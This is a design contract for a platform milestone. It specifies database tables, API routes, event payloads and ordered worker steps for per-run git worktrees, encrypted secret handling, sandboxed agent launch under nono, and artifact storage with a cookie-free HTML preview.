# M3 contract — workspaces, secrets, sandboxed agent launch, APM staging, artifacts

**Design contract for the M3 implementation workers.** Authoritative decisions live in
[ADR-0017](adr/ADR-0017-run-workspaces-mirrors-worktrees-and-volume-identity.md) (workspaces, mirrors,
worktrees, volume identity), [ADR-0018](adr/ADR-0018-secretref-materialization-and-envelope-encryption.md)
(secrets and `.env`), [ADR-0019](adr/ADR-0019-agent-launch-under-nono-in-required-mode.md) (launch under
nono), [ADR-0020](adr/ADR-0020-artifact-store-and-sandboxed-html-preview.md) (artifacts and preview);
this file is the *concrete surface* — tables, routes, events, worker duties and the exit test — that
three workers build against so their code cannot drift. Where this file and an ADR disagree, the ADR
wins and this file is a bug. Roadmap anchor: `communication-spec/11-build-roadmap.md` § M3. Spec
anchors: `05` (all of it), `04` § "Profile → environment → instance", `09`, `12` cases 12–17,
D-011/D-017/D-021/D-024/D-025.

M2's turn loop (`internal/worker/turnloop.go`, `internal/worker/workspace.go`), the ACP runtime
(`internal/agent/acp/`) and the journal/event machinery (ADR-0014/0016) are the substrate. M3 does not
change them; it inserts itself between "claim a turn" and "exec the adapter".

## 0. What M3 will and will NOT prove

**Will prove** (each has a scripted gate in § 6; what the first real run produced is § 7): multi-repo run workspaces on per-project mirrors with
per-run worktrees; concurrent edit isolation (case 17); an agent's *commit* reach bounded to its own ref
namespace, measured through a real nono sandbox; worker volume identity and honest loss reporting
(case 20's same-volume arm); `.env` materialization with git/artifact/log absence (case 12);
secret references, project scope, encryption at rest, metadata-only API (case 15's secret half);
`required`-mode verify-then-run abort with a visible enforcement event (case 13); APM staging pinned by
per-target lock digest, stable across a remote change (case 14); artifacts with metadata, download and
a cookie-free sandboxed HTML preview (case 16).

**Will NOT prove, and no M3 text may claim it:** tenant isolation (one Unix uid — D-025 **Open**, `05`
"Trust caveat", ADR-0019 Security); enforced network egress for a *real* model-API turn (ADR-0019
Decision 3: the `agent-turn` profile runs with egress unenforced; denial is proven on a separate
command-only profile, D-021 stays Provisional); cross-host checkpoint rehydration (D-024 stays Open;
only capture + honest loss is proven); the S3-compatible backend (contract only, no implementation —
D-014 stays Proposed); per-tenant harness credentials (ADR-0019 Decision 4 keeps them shared);
`integration_broker` delivery; resource/CPU/memory limits; rootless Podman; the "kernel lacks Landlock"
abort branch; `preapproved_within_sandbox` as a usable permission mode (it stays gated on an observed
`Verified=true` launch, ADR-0016 § 10).

## 1. Persistence

New migration `internal/store/postgres/migrations/00004_m3_workspaces_secrets_artifacts.sql`
(forward-only, ADR-0013; `ExpectedSchemaVersion()` → 4). The DDL below **is** the migration: it was
written as the contract, then corrected against the M3 probe suite
(`docs/compatibility/probes/m3/results-host.txt`, `docs/compatibility/M3-PROBES.md`) and landed; where
this file and the migration file disagree, the migration file is what the database enforces, and this
file is a bug. Nothing rewrites `00001`–`00003` rows.

```sql
-- ADR-0017 D2, as corrected by probe V3/V5b: volume identity is measured PER
-- STORAGE ROOT and is a digest of (st_dev, st_ino, root path). A single
-- `workers.volume_id` column could name only one of the two M3 trees, and
-- st_dev alone cannot tell two docker named volumes mounted at one path apart.
-- An M2-era worker has NO row here, which reads as "unknown volume" — the only
-- value no M3 workspace may bind to.
CREATE TABLE worker_volumes (
    worker_id   uuid NOT NULL REFERENCES workers (id),
    root_kind   text NOT NULL CHECK (root_kind IN ('workspaces','repos')),
    root_path   text NOT NULL,
    st_dev      bigint NOT NULL CHECK (st_dev >= 0),
    st_ino      bigint NOT NULL CHECK (st_ino > 0),
    fstype      text,
    volume_id   text NOT NULL CHECK (volume_id ~ '^sha256:[0-9a-f]{64}$'),
    observed_at timestamptz NOT NULL DEFAULT now(),
    PRIMARY KEY (worker_id, root_kind),
    CONSTRAINT worker_volumes_path_absolute CHECK (root_path LIKE '/%' AND root_path NOT LIKE '%..%')
);
CREATE INDEX worker_volumes_volume_idx ON worker_volumes (volume_id, worker_id);

ALTER TABLE workers ADD COLUMN sandbox_backend   text NOT NULL DEFAULT 'none';
ALTER TABLE workers ADD COLUMN sandbox_version   text;
ALTER TABLE workers ADD COLUMN sandbox_enforcement text NOT NULL DEFAULT 'disabled'
    CHECK (sandbox_enforcement IN ('required','permissive-dev','disabled'));
ALTER TABLE workers ADD COLUMN sandbox_verified  boolean NOT NULL DEFAULT false;
ALTER TABLE workers ADD COLUMN sandbox_notes     jsonb NOT NULL DEFAULT '[]'::jsonb;

CREATE TABLE workspaces (                    -- ADR-0017 D3
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL,
    project_id     uuid NOT NULL REFERENCES projects (id),
    scope_kind     text NOT NULL CHECK (scope_kind IN ('conversation','run')),
    conversation_id uuid,                    -- set iff scope_kind='conversation'
    run_id         uuid,                     -- set iff scope_kind='run' (M4 fills)
    worker_id      uuid NOT NULL REFERENCES workers (id),
    volume_id      text NOT NULL CHECK (volume_id ~ '^sha256:[0-9a-f]{64}$'),
    root_path      text NOT NULL,            -- <WORKSPACE_ROOT>/<scope-kind>/<scope-id>/
    -- The one directory granted recursively. GENERATED, never supplied:
    -- probe C-META showed `--allow <root>` reaches meta/, so worker-only state
    -- is a sibling of the granted tree rather than a child of the workspace.
    agent_root     text GENERATED ALWAYS AS (root_path || '/work') STORED NOT NULL,
    workspace_mode text NOT NULL DEFAULT 'worktree' CHECK (workspace_mode IN ('worktree','clone')),
    state          text NOT NULL CHECK (state IN ('preparing','ready','quarantined','released','lost')),
    created_at     timestamptz NOT NULL DEFAULT now(),
    ready_at       timestamptz, released_at timestamptz, lost_at timestamptz,
    CONSTRAINT workspaces_scope_pointer CHECK (
        (scope_kind = 'conversation' AND conversation_id IS NOT NULL AND run_id IS NULL) OR
        (scope_kind = 'run'           AND run_id          IS NOT NULL AND conversation_id IS NULL)),
    CONSTRAINT workspaces_state_timestamped CHECK (
        (state IN ('ready','quarantined','released','lost')) = (ready_at IS NOT NULL)),
    CONSTRAINT workspaces_path_absolute CHECK (root_path LIKE '/%' AND root_path NOT LIKE '%..%')
);
CREATE UNIQUE INDEX workspaces_one_live_per_conversation_idx
    ON workspaces (conversation_id) WHERE state IN ('preparing','ready','quarantined');
CREATE INDEX workspaces_worker_volume_idx ON workspaces (worker_id, volume_id, state);

CREATE TABLE workspace_repos (               -- ADR-0017 D4: the paths a policy names
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    workspace_id   uuid NOT NULL REFERENCES workspaces (id),
    repository_id  uuid NOT NULL REFERENCES repositories (id),
    checkout_path  text NOT NULL,            -- <agent_root>/repos/<name>
    mirror_path    text NOT NULL,            -- <repos root>/<project>/<name>.git
    mirror_volume_id text NOT NULL CHECK (mirror_volume_id ~ '^sha256:[0-9a-f]{64}$'),
    admin_dir      text NOT NULL,            -- read back with `rev-parse --absolute-git-dir`
    run_ref        text NOT NULL,            -- <scope-id>/<name>
    base_commit    text NOT NULL,
    head_commit    text,
    modified_paths jsonb NOT NULL DEFAULT '[]'::jsonb,   -- manifest, exclusions applied
    excluded_paths jsonb NOT NULL DEFAULT '[]'::jsonb,   -- ADR-0017 D6 / ADR-0018 clause 3
    UNIQUE (workspace_id, repository_id),
    -- Every path below lands in a sandbox grant, so absolute + `..`-free is a
    -- write-time rule and not only an adapter rule (ADR-0019 FC3/FC6).
    CONSTRAINT workspace_repos_paths_absolute CHECK (
        (checkout_path LIKE '/%' AND checkout_path NOT LIKE '%..%') AND
        (mirror_path LIKE '/%' AND mirror_path NOT LIKE '%..%') AND
        (admin_dir LIKE '/%' AND admin_dir NOT LIKE '%..%') AND
        (checkout_path NOT LIKE '%//%' AND mirror_path NOT LIKE '%//%'
            AND admin_dir NOT LIKE '%//%'))
);

CREATE TABLE secret_metadata (               -- ADR-0018 D1. NEVER a plaintext column.
    id            uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL REFERENCES organizations (id),
    project_id    uuid REFERENCES projects (id),
    scope         text NOT NULL CHECK (scope IN ('project','org')),
    slug          text NOT NULL,
    purpose       text NOT NULL DEFAULT '',
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file','integration_broker')),
    current_version int NOT NULL DEFAULT 1 CHECK (current_version >= 1),
    allowed_agent_profile_ids uuid[] NOT NULL DEFAULT '{}',   -- empty == denied to all
    allowed_node_template_ids uuid[] NOT NULL DEFAULT '{}',
    audit_policy  text NOT NULL DEFAULT 'materialization' CHECK (audit_policy IN ('materialization','materialization_and_access')),
    created_by    uuid NOT NULL REFERENCES users (id),
    created_at    timestamptz NOT NULL DEFAULT now(),
    rotated_at    timestamptz, revoked_at timestamptz,
    CONSTRAINT secrets_scope_pointer CHECK (
        (scope = 'project' AND project_id IS NOT NULL) OR (scope = 'org' AND project_id IS NULL))
);
CREATE UNIQUE INDEX secret_metadata_project_slug_idx ON secret_metadata (project_id, slug)
    WHERE project_id IS NOT NULL;
CREATE UNIQUE INDEX secret_metadata_org_slug_idx ON secret_metadata (organization_id, slug)
    WHERE project_id IS NULL;   -- partial: see the project-scope note below

CREATE TABLE secret_versions (               -- immutable, envelope-encrypted
    secret_id    uuid NOT NULL REFERENCES secret_metadata (id),
    version      int  NOT NULL CHECK (version >= 1),
    key_id       text NOT NULL,              -- master-key generation, OUTSIDE the DB (ADR-0018 D2)
    nonce        bytea NOT NULL CHECK (octet_length(nonce) = 12),
    ciphertext   bytea NOT NULL,
    aad          text  NOT NULL,             -- secret_id||version||key_id||sha256(slug)
    content_sha256 text NOT NULL,            -- retry-comparison only; never API-exposed
    created_by   uuid NOT NULL REFERENCES users (id),
    created_at   timestamptz NOT NULL DEFAULT now(),
    revoked_at   timestamptz,
    PRIMARY KEY (secret_id, version),
    CONSTRAINT secret_versions_not_empty CHECK (octet_length(ciphertext) > 0)
);

CREATE TABLE secret_mounts (                 -- 05's secret_mounts: [], declared placement
    id           uuid PRIMARY KEY DEFAULT uuidv7(),
    project_id   uuid NOT NULL REFERENCES projects (id),
    secret_id    uuid NOT NULL REFERENCES secret_metadata (id),
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file','integration_broker')),
    repository_id uuid REFERENCES repositories (id),  -- required for env_file
    relative_path text,                     -- required for env_file; relative, validated at use
    env_name     text,                      -- required for env
    key          text,                      -- single-key extraction from a multi-line value
    lifecycle    text NOT NULL DEFAULT 'turn' CHECK (lifecycle IN ('turn','workspace','node_attempt')),
    allow_tracked boolean NOT NULL DEFAULT false,     -- 05's explicit policy exception
    created_at   timestamptz NOT NULL DEFAULT now(),
    CONSTRAINT mounts_shape CHECK (
        (delivery_mode = 'env_file' AND repository_id IS NOT NULL
            AND relative_path IS NOT NULL AND relative_path NOT LIKE '/%'
            AND relative_path NOT LIKE '%..%' AND relative_path NOT LIKE '%//%'
            AND env_name IS NULL) OR
        (delivery_mode = 'env' AND env_name IS NOT NULL AND relative_path IS NULL
            AND repository_id IS NULL))
);

CREATE TABLE secret_materializations (       -- ADR-0018 D1: present-only-during-the-unit proof
    id            bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    secret_id     uuid NOT NULL REFERENCES secret_metadata (id),
    secret_version int NOT NULL,
    project_id    uuid NOT NULL REFERENCES projects (id),
    workspace_id  uuid REFERENCES workspaces (id),
    turn_id       uuid,                      -- M3's unit; attempt_id arrives with M4
    attempt_id    uuid,
    worker_id     uuid NOT NULL REFERENCES workers (id),
    delivery_mode text NOT NULL CHECK (delivery_mode IN ('env','env_file')),
    target        text NOT NULL,             -- env name or relative path
    file_mode     int,                       -- 384 == 0o600 for env_file
    materialized_at timestamptz NOT NULL DEFAULT now(),
    cleaned_at    timestamptz,
    cleaned_by    text CHECK (cleaned_by IN ('worker','reconciler','startup_sweep'))
);
CREATE INDEX secret_materializations_uncleaned_idx ON secret_materializations (workspace_id)
    WHERE cleaned_at IS NULL;

CREATE TABLE artifacts (                     -- ADR-0020 D2; bytes never in a row
    id             uuid PRIMARY KEY DEFAULT uuidv7(),
    organization_id uuid NOT NULL,
    project_id     uuid NOT NULL REFERENCES projects (id),
    run_id uuid, node_execution_id uuid, attempt_id uuid,
    conversation_id uuid, turn_id uuid, worker_id uuid,
    name           text NOT NULL,
    kind           text NOT NULL CHECK (kind IN ('markdown','image','html','json','patch','archive','checkpoint')),
    media_type     text NOT NULL,
    sha256         text NOT NULL CHECK (sha256 ~ '^[0-9a-f]{64}$'),
    size_bytes     bigint NOT NULL CHECK (size_bytes >= 0),
    storage_backend text NOT NULL CHECK (storage_backend IN ('local','s3')),
    storage_key    text NOT NULL,
    sensitivity    text NOT NULL DEFAULT 'standard'
        CHECK (sensitivity IN ('standard','internal','restricted','secret')),
    state          text NOT NULL DEFAULT 'uploading'
        CHECK (state IN ('uploading','ready','orphan','deleted')),
    redaction_count int NOT NULL DEFAULT 0,
    created_by     text NOT NULL,
    created_at     timestamptz NOT NULL DEFAULT now(),
    ready_at       timestamptz, expires_at timestamptz, deleted_at timestamptz
    -- No table-wide UNIQUE here any more: 00019 (ADR-0020 D2 amendment,
    -- 2026-10-27) replaced the original UNIQUE (project_id, kind, sha256)
    -- with the owner-scoped dedupe indexes created below; the bytes stay
    -- shared (several rows may name one storage_key).
);
CREATE INDEX artifacts_project_created_idx ON artifacts (project_id, created_at DESC, id DESC);
CREATE INDEX artifacts_sweep_idx ON artifacts (id) WHERE state = 'uploading';
CREATE INDEX artifacts_expiry_idx ON artifacts (expires_at, id)
    WHERE state = 'ready' AND expires_at IS NOT NULL;
CREATE INDEX artifacts_sha256_idx ON artifacts (sha256);   -- ADR-0020 D2's dedupe lookup
CREATE UNIQUE INDEX artifacts_run_dedupe_idx ON artifacts (run_id, node_execution_id, kind, sha256)
    NULLS NOT DISTINCT WHERE attempt_id IS NOT NULL;       -- ADR-0020 D2's 00019 amendment (run side)
CREATE UNIQUE INDEX artifacts_turn_dedupe_idx ON artifacts (turn_id, kind, sha256)
    WHERE turn_id IS NOT NULL;                             -- ADR-0020 D2's 00019 amendment (turn side)

-- ADR-0008/0016: agent_profiles gains the revision-ish fields M3 needs (no revisions table yet).
ALTER TABLE agent_profiles ADD COLUMN workspace_mode text NOT NULL DEFAULT 'worktree'
    CHECK (workspace_mode IN ('worktree','clone'));
ALTER TABLE agent_profiles ADD COLUMN sandbox_enforcement text NOT NULL DEFAULT 'required'
    CHECK (sandbox_enforcement IN ('required','permissive-dev','disabled'));
ALTER TABLE agent_profiles ADD COLUMN commit_granted boolean NOT NULL DEFAULT false;
ALTER TABLE agent_profiles ADD COLUMN apm_package_ref text;
ALTER TABLE agent_profiles ADD COLUMN apm_target text CHECK (apm_target IN ('claude','codex'));
ALTER TABLE agent_profiles ADD COLUMN apm_lock_digest text CHECK (apm_lock_digest IS NULL OR apm_lock_digest ~ '^sha256:[0-9a-f]{64}$');
ALTER TABLE agent_profiles ADD COLUMN secret_mount_ids uuid[] NOT NULL DEFAULT '{}';
```

CHECK constraints that must be asserted as *constraint behaviour* on a database that actually ran the
migration (ADR-0016's `migrate_test.go` pattern): `workspaces_scope_pointer`,
`workspaces_one_live_per_conversation_idx` (`23505` for a second live workspace, insertable after
`released`), `workspaces_path_absolute` (reject `..`, reject relative),
`workspaces.agent_root` being **generated** (an INSERT that names it is refused — `428C9`, the
assertion that no caller can put `meta/` inside the recursive grant), `worker_volumes`'s identity
pattern (reject a bare `st_dev`, reject bare hex, reject a wrong prefix), its PK
, `st_ino > 0`, and that two workers may report
different inodes at the same path (the identity that case 20 compares), `workspace_repos_paths_absolute`
(relative `mirror_path` and a `..`-bearing `checkout_path` both `23514`) plus
`workspace_repos.mirror_volume_id` (`23502` when absent, `23514` when it is not a `sha256:` digest),
`secrets_scope_pointer`
(org-with-project and project-without-org both `23514`), `secret_versions_not_empty`,
`mounts_shape` (`env` with a path and `env_file` without a repository both `23514`),
`artifacts.sha256` pattern, the 00019 owner-scoped artifact dedupe (`artifacts_run_dedupe_idx`: a
second row for the same `(run_id, node_execution_id, kind, sha256)` among attempt-owned rows is
refused — `23505` — while the same bytes under another run or another node are their own rows;
`artifacts_turn_dedupe_idx`: same for `(turn_id, kind, sha256)` among turn captures), and
`agent_profiles.apm_lock_digest` pattern. There is deliberately **no** column anywhere that could hold
a plaintext secret, and `secret_versions.ciphertext` is unreadable from the API layer by construction
(no store method exposes it to `internal/api`).

Two invariants are *not* columns and the code has to carry them itself: `checkout_path` living under
`workspaces.agent_root` (a CHECK cannot see the sibling row), and the correspondence between
`workspaces.volume_id` / `workspace_repos.mirror_volume_id` and a `worker_volumes` row — deliberately
not foreign keys, because volume identity is a historical fact about a write and the worker's current
measurement changes under a replaced volume.

## 2. HTTP surface

Conventions unchanged (ADR-0014): `/api/v1`, `application/problem+json`, `404` for a project-scoped
resource the caller cannot see, `X-CSRF-Token` + `Origin` on every mutation, authorization in
middleware before the handler, every list query carrying a project predicate.

| Route | Purpose / rules |
|---|---|
| `GET /api/v1/projects/{projectId}/secrets` | List **metadata only** (`id, slug, scope, purpose, delivery_mode, current_version, allowed_agent_profile_ids, revoked_at, created_at`). Never a value, never a version list beyond `current_version`. Viewer+. |
| `POST /api/v1/projects/{projectId}/secrets` | Create with `{slug, purpose, delivery_mode, allowed_agent_profile_ids, value}`. `value` is write-only: it is encrypted, stored in `secret_versions` v1, and appears in **no** response, event or log. Maintainer+. |
| `PUT /api/v1/projects/{projectId}/secrets/{secretId}` | Metadata/policy only (purpose, allowlists, audit policy). A body containing `value` is a `400` — rotation is a different verb. Maintainer+. |
| `POST /api/v1/projects/{projectId}/secrets/{secretId}/versions` | Append immutable version `{value}`; bumps `current_version`, sets `rotated_at`. The old version stays (an in-flight unit pinned it). Maintainer+. |
| `POST /api/v1/projects/{projectId}/secrets/{secretId}:revoke` | `revoked_at` on the row and all versions; later materializations refuse it (ADR-0018 D2.4). Maintainer+. |
| `GET /api/v1/projects/{projectId}/secrets/{secretId}/materializations` | Audit view: which unit, which target, when cleaned. Metadata only. Maintainer+. |
| `POST /api/v1/projects/{projectId}/secret-mounts` | Declare a mount (`05`'s YAML shape, validated by `mounts_shape` + repository existence). Maintainer+. |
| `GET /api/v1/projects/{projectId}/secret-mounts` | List declarations. Viewer+. |
| `DELETE /api/v1/projects/{projectId}/secret-mounts/{mountId}` | Remove a declaration; does not revoke the secret. Maintainer+. |
| `GET /api/v1/projects/{projectId}/workspaces` | Live + recent workspaces: `scope_kind`, `state`, `workspace_mode`, `worker_id`, `volume_id`, repos with `run_ref`/`base_commit`/`head_commit`, `excluded_paths`. **Never `root_path`/`mirror_path`/`admin_dir`** — absolute host paths are internal topology (ADR-0014's `X-Communication-Replica` precedent is the limit of what browsers learn). Viewer+. |
| `GET /api/v1/workspaces/{workspaceId}` | One workspace, same field rules, `404` from outside the project. Viewer+. |
| `GET /api/v1/workspaces/{workspaceId}/repos/{repositoryId}/status` | Worker-fed inspection: dirty summary + `modified_paths` (exclusions applied). Read from `workspace_repos`, not by shelling into the worker. Contributor+. |
| `GET /api/v1/turns/{turnId}/sandbox` | The enforcement record for one launched unit: `{stage, reason, policy_digest, backend, backend_version, verified, af_unix_mediation, network_enforced, child_started, grants[], denied_what[]}` — the turn's `workspace_id`/`worker_id` only as ids. Authorized through the turn → conversation → **project** predicate. Viewer+ (`10`'s ops/run-inspector need it, and `09` forbids an accidental worker-service surface), `404` otherwise. |
| `GET /api/v1/projects/{projectId}/artifacts` | Sensitivity-filtered list (ADR-0020 D3). Viewer+. |
| `GET /api/v1/artifacts/{artifactId}` | Metadata + `preview_url` when allowed; `storage_key` never serialized. Viewer+. |
| `GET /api/v1/artifacts/{artifactId}/content` | Streamed bytes; `text/html` served as `text/plain` + `Content-Disposition: attachment`. Contributor+ per sensitivity table. |
| `POST /api/v1/artifacts/{artifactId}/preview-token` | Mint a single-artifact, digest-bound, short-TTL token; audited as an access. Contributor+ for `standard|internal` only. |
| `GET /api/v1/system/sandbox` | Worker sandbox health for `10`'s ops page: per worker `sandbox_backend/version/enforcement/verified/notes`, the **per-root** volume identities from `worker_volumes`, plus the pinned nono version and policy digest. Session required, no membership (matches `GET /api/v1/workers`). |

**Deliberately absent, and a lint/test must keep it absent:** any route returning a secret value
(including "masked", "hint", "last-4" or an admin override), any route accepting a `storage_key`, any
`PUT /artifacts/{id}` (artifacts are immutable), any browser-reachable path that runs artifact script
(`…/render`, `…/view`), and any worker-service endpoint (`09`: the browser API must not accidentally
expose worker internals — the workspace inspection routes read database rows written by the worker,
never the worker).

Preview delivery is a **separate origin**, not an API route: `GET http://preview.localhost:18084/preview/{token}`
served by the same binary behind a host gate (ADR-0020 D6). `openapi.yaml` documents it as an external
URL template with a note, because putting it in `/api/v1` would imply it shares the app's cookie scope.

## 3. Event vocabulary

Names satisfy the envelope schema's `^[a-z]+(\.[a-z_]+)+$` (`api/schemas/event-envelope.schema.json`),
payload structs live in `internal/events/events.go` (one shape for control plane and worker — the
ADR-0016 rule, with `events_test.go` pinning JSON member sets and OpenAPI documentation), every
payload is an object carrying `project_id` plus the ids it correlates on, and **no payload carries a
secret value, a `.env` body, an absolute host path or a prompt** (ADR-0013 Security; `05`: "Never
include generated `.env` content in conversation logs or artifacts").

| New type | Payload members (exactly the JSON members of the Go struct — this table is checked against both `internal/events/events.go` and the OpenAPI payload table by `events_test.go`) | Emitted by / when |
|---|---|---|
| `workspace.prepared` | `workspace_id, project_id, scope_kind, conversation_id, run_id, worker_id, volume_id, workspace_mode, repos[], base_commits{}, policy_digest` — `repos[]` items are `{repository_id, name, run_ref}`, **never paths** | worker, once per workspace `preparing→ready` |
| `workspace.committed` | `workspace_id, project_id, repository_id, run_ref, head_commit` | worker, after a fenced post-commit ref read (ADR-0019's P8 rule: exit status alone is not proof) |
| `workspace.quarantined` | `workspace_id, project_id, reason` (`secret_left_behind, exclusion_failed, worktree_unusable`) — no free text, because the git errors that would explain it quote absolute host paths | worker or reconciler |
| `workspace.released` | `workspace_id, project_id, repos_pruned boolean` | worker, at cleanup |
| `workspace.recovery_lost` | `workspace_id, project_id, expected_volume_id, found_volume_id, reason` (`volume_changed, path_missing, different_worker`) | worker at Prepare, or reconciler — this is case 20's honest arm |
| `sandbox.enforcement_failed` | `project_id, turn_id, workspace_id, worker_id, stage` (`probe,profile,policy_assert,grant_assert,exec,runtime`), `reason` (ADR-0019 D6 enum), `backend, backend_version, policy_digest, verified=false, child_started, detail` (bounded, redacted: host paths inside it are replaced by grant roles before it is appended) | worker, before/instead of launching; **must** be followed by `conversation.turn.failed` with `reason="sandbox_enforcement_failed"` |
| `sandbox.verified` | `project_id, turn_id, workspace_id, worker_id, policy_digest, backend, backend_version, af_unix_mediation, network_enforced boolean, grants[], commit_granted boolean, verified boolean` — `grants[]` items are `{role, access}` from ADR-0017 D4's role list, **not** paths (deviation D14) | worker, after N-a…N-d pass — the row that makes "this turn really ran under `required`" answerable without reading worker logs |
| `secret.created` | `secret_id, project_id, slug, scope, purpose, delivery_mode, version, allowed_agent_profile_ids` | API (never a value) |
| `secret.version.added` | `secret_id, project_id, version, key_id, previous_version` — **no `content_sha256`** (deviation D15: the journal is a browser-visible API, and a digest of a low-entropy secret is an offline guessing oracle for every project viewer) | API |
| `secret.policy.updated` | `secret_id, project_id, before{purpose, audit_policy, allowed_agent_profile_ids}, after{…}` | API |
| `secret.revoked` | `secret_id, project_id, versions[], revoked_at, revoked_by` | API |
| `secret.materialized` | **metadata only**: `secret_id, project_id, slug, version, delivery_mode, repository_name, relative_path, env_name, lifecycle, mode, workspace_id, turn_id, policy_digest` — and structurally no `value` member (`events_test.go` asserts the member set) | worker, immediately before/after the write |
| `secret.removed` | `secret_id, project_id, target, workspace_id, turn_id, cleaned_by` | worker / startup sweep / reconciler |
| `secret.materialization_failed` | `secret_id, project_id, slug, delivery_mode, target, reason` (`path_escape, absolute_path, bad_shape, tracked_target, exists, keyring_unreadable, revoked_version, broker_unsupported, symlink_parent, mirror_writable` — the first three are the probe's C-ENV6 battery, which the contract's original list had collapsed into `path_escape`), `workspace_id, turn_id, child_started boolean` | worker, before launch (fail-closed) |
| `artifact.created` | `artifact_id, project_id, name, kind, media_type, sha256, size_bytes, sensitivity, redaction_count, workspace_id, turn_id` | worker, in the same fenced transaction that flips `state='ready'` |
| `artifact.deleted` | `artifact_id, project_id, reason` (`expired, swept, retention`) | reconciler / sweep |
| `repository.mirror_updated` | `project_id, repository_id, worker_id, mirror_kind, from_commit, to_commit, fetch_duration_ms` | worker (mirror create/fetch) |

Reused unchanged from M2: `conversation.turn.started|completed|cancelled|failed|interrupted`,
`conversation.tool.*`, `conversation.permission.*`, `agent.session.*`. New correlation: turn-scoped
appends additionally set `workspace_id` **only** if the envelope schema gains that optional member
(it does not today) — so until the envelope is amended (a schema-versioned change), `workspace_id`
lives inside `payload` and the journal's id columns stay as ADR-0016 left them. That is the conservative
choice and it is recorded as such.

## 4. Worker responsibilities

Ordering is normative — the assertion is *a process is never exec'd before the policy that governs it
is known good* (ADR-0009).

1. **Prepare** (ADR-0017 D1/D4): measure volume identity **per configured storage root** — `stat`
   each root, hash `(st_dev, st_ino, root_path)`, upsert `worker_volumes` (probe V3: `st_dev` alone
   calls a replaced named volume the same one; V5b: the workspaces root and the mirror root share a
   device and differ in inode) — then claim or create the `workspaces` row (whose `agent_root` is
   derived by the database, `<root_path>/work`), create the sibling `meta/` (worker-only) and `work/`
   (granted) directories, create-or-fetch the **per-project** mirror,
   `git worktree add -b <scope-id>/<name> <agent_root>/repos/<name> <ref>`, read the real `admin_dir`
   back with **`git -C <worktree> rev-parse --absolute-git-dir`** (P1 says read it back; probe G1b
   falsified the *mechanism* the ADR named — `git worktree list --porcelain` emitted no `gitdir:` line
   for the auto-suffixed second worktree on git 2.56.0, and G1c confirms `rev-parse` returns it),
   pre-create `<mirror>/logs/refs/heads/<scope-id>/` (P7), create `work/home/` 0700, persist
   `workspace_repos` including `mirror_volume_id`. Any failure is a visible transcript note *and* a
   `workspaces.state` transition — M2's "clone failed, keep chatting" behaviour stays only for
   conversations that need no repository, and a `ready` workspace never silently lacks a repo.
2. **Stage APM** (ADR-0008, D-017): with `HOME=<workspace>/home` (never the worker's HOME — APM.md T4),
   `apm install --frozen --target <claude|codex>` into the run checkout, validate
   `sha256(apm.lock.yaml)` against `agent_profiles.apm_lock_digest` **per target** before launch, add
   the generated paths to `excluded_paths`, and refuse a launch on digest mismatch (case 14's stability
   test). `apm` itself is vendored at `0.34.0` (ADR-0008 D1).
3. **Materialize** (ADR-0018 D4, ordered exactly): validate → `git ls-files` check → append the path to
   `<mirror>/info/exclude` and `git check-ignore -v` confirm → `O_CREAT|O_EXCL` 0600 write →
   `secret.materialized`. `env` entries go into the launch `Env` list, which is **built from scratch**,
   never `os.Environ()` (`internal/agent/acp/runtime.go`'s fallback is the leak to close).
4. **Build the policy** (ADR-0019 D1): grants from `workspace_repos` + profile axes (`workspace_mode`,
   `commit_granted`) + `harness_credential_dirs`. **The workspace root is never granted recursively** —
   `--allow <dir>` is recursive, so the grant is `agent_root` (and the named mirror subpaths), which is
   why `meta/` is its sibling and not its child (probe C-META, deviation D13). Abort if any path is
   under `/tmp`, `/var/tmp`, `/dev/shm` (P9/N1) or is not an absolute, `..`-free, existing path (FC3).
5. **Verify then launch** (ADR-0019 D2 N-a…N-e), then hand stdio pipes to `acp.Runtime` unchanged and
   record `sandbox.verified` / `sandbox.enforcement_failed`.
6. **Capture at the unit boundary** (ADR-0017 D8, ADR-0020 D8): dirty diff summary + modified-path
   manifest with `excluded_paths` subtracted, stored as `kind=checkpoint`/`json` artifacts — the
   *capture* only, no recoverability claim (D-024 Open).
7. **Publish artifacts**: exclusion + secret scan + `redaction_count`, `Put` bytes, then one fenced
   transaction inserting the row and `artifact.created` (ADR-0016 § 9.2: an unfenced worker may not
   publish anything).
8. **Clean up**: materialized files removed (`defer` + startup sweep over `cleaned_at IS NULL`),
   `home/` deleted, worktree removed + `prune` (WORKSPACES.md W6), `workspace.released`; a leftover
   secret file moves the workspace to `quarantined` and fails the unit.
9. **Never**: restrict the worker process itself (`05`), run `git gc` inside an attempt (ADR-0010 D6),
   write a secret to the journal/artifacts/`audit_events.detail`, or fall back to
   `permissive-dev`/`disabled` because `required` refused — that is a configured choice, not a retry.

The control plane's share of the work: secret CRUD + audit, workspace/artifact/turn-sandbox reads
(always through a project predicate), preview-token minting, the reconciler extensions for
`uploading→orphan`, uncleaned materializations and expired artifacts (one advisory-locked pass, the
ADR-0016 pattern), and readiness that reports the sandbox mode it was configured with.

## 5. Deployment surface M3 needs (so the plan below can run)

| Change | Where | Why it is required by evidence |
|---|---|---|
| Vendor `nono 0.80.0` (tarball sha256 `6da665b6…f17037f`, binary sha256 `e02d003d…eff1287d`) and `apm 0.34.0` (sha256 `4487af55…cde8c`) into the worker image | `worker/Dockerfile` | ADR-0019 D1; the image has neither today, and `doctor`/`required` must run where the agent runs |
| `worker/sandbox/profiles/communication-agent.json` + `worker/launchers.yaml` | new asset dirs (ADR-0007) | ADR-0009 D4 requires `-p <path>` over CLI flags (the built-in `default` profile is silently mixed in); `nono profile init` cannot author a path-named file (N3) |
| Landlock probe of `node:22-bookworm-slim` under Docker 29.9.0 builtin seccomp | `docs/compatibility/probes/sandbox/` rerun | ADR-0019's biggest GAP: only `debian:trixie-slim` was probed |
| Named volumes `repos` (mirror root, rw on worker only), `artifacts` (rw worker, **ro** both API replicas), `masterkeys` (ro everywhere, generated once by the `keyring-init` one-shot) — **landed in `compose.yml`** | `compose.yml` | ADR-0017 D1 (mirrors beside workspaces, and probe V5b's reason they are *measured separately*: one device, two inodes, one identity column could only name one), ADR-0020 (multi-replica reads), ADR-0018 D2.2 (keyring outside the DB, never an env var, never printed — the one-shot writes it under `umask 077` with `od` and logs only that it generated one) |
